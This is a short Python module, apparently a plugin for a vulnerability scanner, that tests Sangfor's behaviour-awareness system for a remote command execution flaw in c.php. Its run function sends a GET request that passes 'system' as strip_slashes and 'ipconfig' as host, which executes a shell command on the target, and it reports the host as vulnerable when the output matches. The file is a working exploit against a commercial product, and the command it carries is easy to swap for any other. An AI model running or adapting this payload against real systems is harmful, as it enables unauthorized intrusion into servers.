#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {}
  ret['links'] = ["https://peiqi.wgpsec.org/wiki/webapp/%E6%B7%B1%E4%BF%A1%E6%9C%8D/%E6%B7%B1%E4%BF%A1%E6%9C%8D%20%E8%A1%8C%E4%B8%BA%E6%84%9F%E7%9F%A5%E7%B3%BB%E7%BB%9F%20c.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html"]
  ret['huixian'] = []
  ret['method'] = 'get'
  ret['bugname'] = "深信服 c.php 远程命令执行漏洞"
  ret['level'] = "high"
  ret['FOFA'] = ''
  ret['auhor'] = 'ppxfx'
  ret['ifbug'] = False
  return ret

def run(url,ua):
  ret = msg()
  headers = {'User-Agent': ua}
  target = "/tool/log/c.php?strip_slashes=system&host=ipconfig"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and "Limit" in res.text and "Host" in res.text:
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret 